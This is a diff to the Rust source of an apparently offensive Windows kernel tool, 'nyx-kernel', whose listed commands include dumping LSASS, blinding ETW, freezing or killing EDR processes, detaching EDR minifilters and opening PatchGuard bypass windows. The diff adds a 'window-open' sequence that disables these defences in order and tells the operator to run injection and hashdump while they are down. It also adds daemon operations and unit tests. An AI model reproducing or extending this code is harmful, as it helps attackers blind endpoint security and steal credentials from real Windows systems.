@@ -20,6 +20,7 @@
 //!   nyx-kernel dump-lsass <pid>
 //!   nyx-kernel neutralize <pid> <freeze|choke|kill>
 //!   nyx-kernel detach-minifilter
+//!   nyx-kernel window-open [pid] / window-close   # T2 operator time-window
 //!   nyx-kernel pg-window   # enter a PatchGuard unchecked window (holds until Ctrl+C)
 //!   nyx-kernel wfp-selftest  # driverless WFP kit e2e (admin; baseline→block→restore)
 //!   nyx-kernel --serve <port>   # daemon mode — REQUIRES NYX_DAEMON_TOKEN (see below)
@@ -276,6 +277,8 @@ fn main() {
     //   {"op":"blind-etw"}               → {"ok":true}\n
     //   {"op":"hide","pid":1234}         → {"ok":true}\n
     //   {"op":"detach-minifilter"}       → {"ok":true}\n
+    //   {"op":"window-open","pid":N}     → {"ok":true,"phase":"open",...}\n
+    //   {"op":"window-close"}            → {"ok":false,"phase":"close","best_effort":true,...}\n
     // Auth: NYX_DAEMON_TOKEN is REQUIRED — the daemon refuses to start
     // without it, and every connection must open with `auth <token>`.
     // Backward-compatible: --serve absent → normal subcommand dispatch below.
@@ -405,6 +408,39 @@ fn main() {
                 std::process::exit(5);
             }
         },
+
+        "window-open" | "window-close" | "window" => {
+            let phase = parse_window_phase(&args);
+            match phase {
+                "open" => {
+                    let pid = parse_window_pid(&args);
+                    match op_window_open(&tier, pid) {
+                        Ok(()) => {
+                            eprintln!(
+                                "[+] window OPEN (blind-etw → neutralize freeze → detach-minifilter)"
+                            );
+                            eprintln!(
+                                "[*] implant tasks are NOT paused; sequence inject/hashdump now, then window-close"
+                            );
+                        }
+                        Err((step, e)) => {
+                            eprintln!("[!] window-open failed at {step}: {e}");
+                            std::process::exit(5);
+                        }
+                    }
+                }
+                "close" => {
+                    println!("{}", window_close_reply());
+                    eprintln!(
+                        "[*] window-close is best-effort: no kit in the default window has a kernelsdk undo op"
+                    );
+                }
+                _ => {
+                    eprintln!("usage: nyx-kernel window --phase open|close [pid]");
+                    std::process::exit(1);
+                }
+            }
+        }
 
         "pg-window" => {
             // Enter a PatchGuard unchecked window. select_pg_window picks the
@@ -906,7 +942,9 @@ fn op_wfp_selftest() -> i32 {
                 }
             }
             if !text.contains(needle) {
-                eprintln!("[!] no live filter references the probe image — install matched nothing?");
+                eprintln!(
+                    "[!] no live filter references the probe image — install matched nothing?"
+                );
             }
         }
         drop(guard);
@@ -1001,6 +1039,32 @@ fn op_detach_minifilter(tier: &nyx_operator_kernelsdk::KernelTier) -> Result<(),
     })?;
     mf.detach_edr(&*tier.rw)
         .map_err(|e| format!("detach failed: {e:?}"))
+}
+
+/// Shared `window-open` sequence (CLI + daemon). Fail-closed: stop at the
+/// first kit error. Neutralize uses Freeze only (existing route; never Kill).
+#[cfg(target_os = "windows")]
+fn op_window_open(
+    tier: &nyx_operator_kernelsdk::KernelTier,
+    pid: Option<u32>,
+) -> Result<(), (&'static str, String)> {
+    for &step in window_open_plan() {
+        match step {
+            "blind-etw" => op_blind_etw(tier).map_err(|e| (step, e))?,
+            "neutralize" => {
+                let pid = pid.ok_or((
+                    step,
+                    "neutralize requires pid > 0 (EDR process for freeze)".into(),
+                ))?;
+                op_neutralize(tier, pid, nyx_operator_kernelsdk::NeutralizeMethod::Freeze)
+                    .map(|_| ())
+                    .map_err(|e| (step, e))?;
+            }
+            "detach-minifilter" => op_detach_minifilter(tier).map_err(|e| (step, e))?,
+            other => return Err((other, format!("unknown window step: {other}"))),
+        }
+    }
+    Ok(())
 }
 
 // ---- §P3.b Daemon mode: persistent kernel session over TCP ----
@@ -1324,6 +1388,28 @@ fn dispatch_daemon_op(line: &str, tier: &nyx_operator_kernelsdk::KernelTier, bui
                 tier.cred.is_some()
             )
         }
+        "window-open" => {
+            let pid = pid_opt.filter(|p| *p > 0);
+            match op_window_open(tier, pid) {
+                Ok(()) => {
+                    let steps: Vec<String> = window_open_plan()
+                        .iter()
+                        .map(|s| format!(r#"{{"step":"{s}","ok":true}}"#))
+                        .collect();
+                    format!(
+                        r#"{{"ok":true,"phase":"open","steps":[{}]}}"#,
+                        steps.join(",")
+                    )
+                }
+                Err((step, e)) => {
+                    let escaped = e.replace('\\', "\\\\").replace('"', "\\\"");
+                    format!(
+                        r#"{{"ok":false,"phase":"open","failed_step":"{step}","err":"{escaped}"}}"#
+                    )
+                }
+            }
+        }
+        "window-close" => window_close_reply(),
         other => json_err(&format!("unknown op: {other}")),
     }
 }
@@ -1407,6 +1493,9 @@ Commands:
   dump-lsass <pid>
   neutralize <pid> <freeze|choke|kill>
   detach-minifilter
+  window-open [pid]        # T2 time-window: blind-etw → neutralize freeze → detach-minifilter
+  window-close             # best-effort reverse; kits without undo report restored:false
+  window --phase open|close [pid]
   pg-window                # PatchGuard unchecked window (holds until Ctrl+C)
   wfp-selftest             # driverless WFP kit e2e: baseline→block→restore (admin; prints {"wfp_selftest":{...}})
   cfg-bypass               # mark NtContinue as a valid CFG call target
@@ -1428,6 +1517,8 @@ Daemon mode (--serve <port>):
     {"op":"detach-minifilter"}            -> {"ok":true}
     {"op":"neutralize","pid":1234,"method":"freeze|choke|kill"} -> {"ok":true}
     {"op":"status"}                       -> {"ok":true,"build":N,...}
+    {"op":"window-open","pid":1234}       -> {"ok":true,"phase":"open","steps":[...]} (fail-closed)
+    {"op":"window-close"}                 -> {"ok":false,"phase":"close","best_effort":true,"steps":[...]}
 
   Wrong/absent token closes the connection with an error line. pid-taking
   ops reject pid <= 0 or absent. Ops are rate-limited per connection
@@ -1435,6 +1526,57 @@ Daemon mode (--serve <port>):
 }
 
 // ---- Helpers ----
+
+/// T2 operator time-window kit order (open). WFP is not in the default window.
+fn window_open_plan() -> &'static [&'static str] {
+    &["blind-etw", "neutralize", "detach-minifilter"]
+}
+
+/// Close runs reverse order. Undo is per-kit (see [`window_undo_op`]).
+fn window_close_plan() -> &'static [&'static str] {
+    &["detach-minifilter", "neutralize", "blind-etw"]
+}
+
+/// Daemon restore op if kernelsdk already has undo. None of the default-window
+/// kits do (MiniFilter unlink self-loops; ETW-TI has no unblind; freeze has
+/// no un-freeze). Do not invent kernel writes.
+fn window_undo_op(_op: &str) -> Option<&'static str> {
+    None
+}
+
+/// Honest close reply: per-step `restored: false` rather than lying `ok: true`.
+fn window_close_reply() -> String {
+    let steps: Vec<String> = window_close_plan()
+        .iter()
+        .map(|op| match window_undo_op(op) {
+            Some(undo) => format!(
+                r#"{{"step":"{op}","restored":false,"reason":"undo op {undo} not dispatched"}}"#
+            ),
+            None => {
+                format!(r#"{{"step":"{op}","restored":false,"reason":"no undo op"}}"#)
+            }
+        })
+        .collect();
+    format!(
+        r#"{{"ok":false,"phase":"close","best_effort":true,"steps":[{}]}}"#,
+        steps.join(",")
+    )
+}
+
+/// Fail-closed fold of open-window step outcomes. Later items are not visited
+/// after the first error.
+fn fold_open_results(
+    pairs: impl IntoIterator<Item = (&'static str, Result<(), String>)>,
+) -> Result<Vec<&'static str>, (&'static str, String, Vec<&'static str>)> {
+    let mut done = Vec::new();
+    for (step, result) in pairs {
+        match result {
+            Ok(()) => done.push(step),
+            Err(err) => return Err((step, err, done)),
+        }
+    }
+    Ok(done)
+}
 
 /// Serialize a [`nyx_operator_kernelsdk::KernelAssessment`] as the single JSON
 /// line the CI gate parses: `{"assess":{...}}`. Hand-rolled (no serde dep —
@@ -1460,7 +1602,10 @@ fn assess_json_line(a: &nyx_operator_kernelsdk::KernelAssessment) -> String {
 
 #[cfg(test)]
 mod tests {
-    use super::assess_json_line;
+    use super::{
+        assess_json_line, fold_open_results, window_close_plan, window_close_reply,
+        window_open_plan, window_undo_op,
+    };
     use nyx_operator_kernelsdk::{KernelAssessment, KernelAssessmentStatus};
 
     /// The CI gate parses this exact JSON: `{"assess":{...}}` with
@@ -1502,6 +1647,64 @@ mod tests {
         let line = assess_json_line(&a);
         assert!(line.contains("\"status\":\"NotAssessed\""));
         assert!(line.contains("\"total_drivers\":0"));
+    }
+
+    #[test]
+    fn window_open_plan_order_excludes_wfp() {
+        assert_eq!(
+            window_open_plan(),
+            &["blind-etw", "neutralize", "detach-minifilter"][..]
+        );
+        assert!(!window_open_plan().iter().any(|op| op.contains("wfp")));
+        let rev: Vec<_> = window_open_plan().iter().rev().copied().collect();
+        assert_eq!(window_close_plan(), rev.as_slice());
+        assert!(window_open_plan()
+            .iter()
+            .all(|op| window_undo_op(op).is_none()));
+    }
+
+    #[test]
+    fn fold_open_results_fail_closed() {
+        struct FailClosedIter {
+            items: Vec<(&'static str, Result<(), String>)>,
+            i: usize,
+            panic_at: usize,
+        }
+        impl Iterator for FailClosedIter {
+            type Item = (&'static str, Result<(), String>);
+            fn next(&mut self) -> Option<Self::Item> {
+                assert!(
+                    self.i < self.panic_at,
+                    "fold continued past fail-closed into later kits"
+                );
+                let item = self.items.get(self.i).cloned();
+                self.i += 1;
+                item
+            }
+        }
+        let iter = FailClosedIter {
+            items: vec![
+                ("blind-etw", Ok(())),
+                ("neutralize", Err("boom".into())),
+                ("detach-minifilter", Ok(())),
+            ],
+            i: 0,
+            panic_at: 2,
+        };
+        let err = fold_open_results(iter).expect_err("second step fails closed");
+        assert_eq!(err.0, "neutralize");
+        assert_eq!(err.1, "boom");
+        assert_eq!(err.2, vec!["blind-etw"]);
+    }
+
+    #[test]
+    fn window_close_reply_is_honest() {
+        let line = window_close_reply();
+        assert!(line.contains("\"ok\":false"));
+        assert!(line.contains("\"best_effort\":true"));
+        assert!(line.contains("\"reason\":\"no undo op\""));
+        assert!(line.contains("detach-minifilter"));
+        assert!(!line.contains("\"ok\":true"));
     }
 }
 
@@ -1549,6 +1752,31 @@ fn unload_phys_bootstrap(b: nyx_operator_kernelsdk::win::KernelBootstrap) {
 #[cfg(target_os = "windows")]
 fn parse_pid(args: &[String], pos: usize) -> u32 {
     args.get(pos).and_then(|s| s.parse().ok()).unwrap_or(0)
+}
+
+#[cfg(target_os = "windows")]
+fn parse_window_phase(args: &[String]) -> &str {
+    let cmd = args.get(1).map(|s| s.as_str()).unwrap_or("");
+    match cmd {
+        "window-open" => "open",
+        "window-close" => "close",
+        "window" => {
+            if let Some(i) = args.iter().position(|a| a == "--phase") {
+                args.get(i + 1).map(|s| s.as_str()).unwrap_or("")
+            } else {
+                args.get(2).map(|s| s.as_str()).unwrap_or("")
+            }
+        }
+        _ => "",
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn parse_window_pid(args: &[String]) -> Option<u32> {
+    args.iter()
+        .rev()
+        .find_map(|s| s.parse::<u32>().ok())
+        .filter(|p| *p > 0)
 }
 
 // ---- Windows FFI helpers for cfg-bypass ----
